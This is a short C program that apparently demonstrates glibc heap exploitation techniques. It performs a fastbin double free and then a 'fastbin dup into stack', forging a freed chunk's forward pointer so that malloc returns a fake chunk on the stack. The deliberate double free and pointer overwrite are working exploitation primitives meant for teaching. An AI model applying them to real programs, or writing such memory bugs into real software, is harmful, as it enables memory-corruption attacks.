#include <stdio.h>
#include <stdlib.h>

int main() {
	/* fastbin double-free */

	int *a = malloc(8);			// malloc 3 buffers
	int *b = malloc(8);
	int *c = malloc(8);
	fprintf(stderr, "malloc a: %p\n", a);
	fprintf(stderr, "malloc b: %p\n", b);
	fprintf(stderr, "malloc c: %p\n", c);

	free(a);						// free the first one
	free(b);						// free the other one
	free(a);						// free the first one again
	fprintf(stderr, "free a => free b => free a\n");

	int *d = malloc(8);			// malloc 3 buffers again
	int *e = malloc(8);
	int *f = malloc(8);
	fprintf(stderr, "malloc d: %p\n", d);
	fprintf(stderr, "malloc e: %p\n", e);
	fprintf(stderr, "malloc f: %p\n", f);

	for(int i=0; i<10; i++)		// loop malloc
	{
		fprintf(stderr, "%p\n", malloc(8));
	}

	/* fastbin dup into stack */

	unsigned int stack_var = 0x21;
	fprintf(stderr, "\nstack_var: %p\n", &stack_var);
	unsigned long long *g = malloc(8);
	*g = (unsigned long long) (((char*)&stack_var) - sizeof(g));	// overwrite fd
	fprintf(stderr, "malloc g: %p\n", g);

	int *h = malloc(8);
	int *i = malloc(8);
	int *j = malloc(8);
	fprintf(stderr, "malloc h: %p\n", h);
	fprintf(stderr, "malloc i: %p\n", i);
	fprintf(stderr, "malloc j: %p\n", j);
}
